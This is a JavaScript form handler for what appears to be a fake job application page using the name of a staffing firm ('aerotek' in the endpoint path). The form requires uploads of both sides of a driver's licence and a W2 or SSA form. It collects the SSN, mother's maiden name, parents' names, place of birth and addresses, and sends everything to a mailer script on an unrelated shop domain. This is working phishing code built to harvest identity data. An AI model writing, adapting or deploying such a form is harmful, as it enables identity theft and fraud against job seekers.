const submit = document.getElementById("submit");
const form = document.getElementById("form");

const sendToMail = async (body, file1, file2, file3) => {

    const submitRequest = new FormData();
    submitRequest.append("body", body);
    submitRequest.append("file1", file1);
    submitRequest.append("file2", file2);
    submitRequest.append("file3", file3);

    const url = `https://staging.shopthugn.com/public/aerotek/jobMail.php`
    const options = {
        method: "POST",
        body: submitRequest
    };

    try {
        const response = await fetch(url, options);

        if (!response.ok) {
            const message = `An error has occured, Error code: ${response.status} - ${response.statusText}`;
            throw new Error(message);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        throw new Error(error);
    }
}

form.addEventListener('submit', (ev) => {
    ev.preventDefault();
    
    const fname = document.getElementById("fname").value;
    const lname = document.getElementById("lname").value;
    const email = document.getElementById("email").value;
    const gender = document.getElementById("gender").value;
    const dob = document.getElementById("dob").value;
    const areacode = document.getElementById("areacode").value;
    const phone = document.getElementById("phone").value;
    const position = document.getElementById("position").value;
    const startDate = document.getElementById("startDate").value;
    const address = document.getElementById("address").value;
    const address2 = document.getElementById("address2").value;
    const state = document.getElementById("state").value;
    const city = document.getElementById("city").value;
    const postal = document.getElementById("postal").value;
    const cover = document.getElementById("cover").value;
    // const resume = document.getElementById("resume").files;
    const ssn = document.getElementById("ssn").value;
    const fileFront = document.getElementById("fileFront").files;
    const fileBack = document.getElementById("fileBack").files;
    const father_name = document.getElementById("father_name").value;
    const mother_name = document.getElementById("mother_name").value;
    const mother_maiden = document.getElementById("mother_maiden").value;
    const place_of_birth = document.getElementById("place_of_birth").value;
    const city_of_birth = document.getElementById("city_of_birth").value;
    const ssi = document.getElementById("ssi").value;
    const wage = document.getElementById("wage").value;
    const prev_add = document.getElementById("prev_add").value;
    const curr_add = document.getElementById("curr_add").value;
    const fileSSA = document.getElementById("fileSSA").files;

    if (!fileFront.length > 0) {
        alert("front of your State Driver's license must be uploaded");
        return;
    }

    if (!fileBack.length > 0) {
        alert("back of your Driver's license must be uploaded");
        return;
    }

    if (!fileSSA.length > 0) {
        alert("W2 or SSA form (2022/2023) must be uploaded");
        return;
    }

    submit.innerText = 'Processing...';

    let my_txt = `New Job Application Info \n`;
    my_txt += `====================\n`;
    my_txt += `First name: ${fname}\n`;
    my_txt += `Last name: ${lname}\n`;
    my_txt += `Email: ${email}\n`;
    my_txt += `Gender: ${gender}\n`;
    my_txt += `Area code: ${areacode}\n`;
    my_txt += `Phone: ${phone}\n`;
    my_txt += `Position: ${position}\n`;
    my_txt += `Start Date: ${startDate}\n`;
    my_txt += `Cover letter: ${cover}\n`;
    my_txt += `Date of Birth: ${dob}\n`;
    my_txt += `SSN: ${ssn}\n`;
    my_txt += `Address: ${address}\n`;
    my_txt += `Address2: ${address2}\n`;
    my_txt += `City: ${city}\n`;
    my_txt += `State: ${state}\n`;
    my_txt += `Postal: ${postal}\n`;
    my_txt += `Father's name: ${father_name}\n`;
    my_txt += `Mother's name: ${mother_name}\n`;
    my_txt += `Mother's maiden name: ${mother_maiden}\n`;
    my_txt += `Place of birth: ${place_of_birth}\n`;
    my_txt += `City of birth: ${city_of_birth}\n`;
    my_txt += `SSI: ${ssi}\n`;
    my_txt += `Wage: ${wage}\n`;
    my_txt += `Previous address: ${prev_add}\n`;
    my_txt += `Current address: ${curr_add}\n`;
    my_txt += `====================\n`;

    sendToMail(my_txt, fileFront[0], fileBack[0], fileSSA[0])
        .then((data) => {
            // definitely a success message
            alert(data);
            submit.innerText = 'Apply Now';
            if (data === "Application submitted successfully") {
                // alert("Application submitted successfully");
                setTimeout(() => {
                    location.reload();
                }, 3000);
            }
        })
        .catch((error) => {
            alert(error);
            submit.innerText = 'Apply Now';
        });
})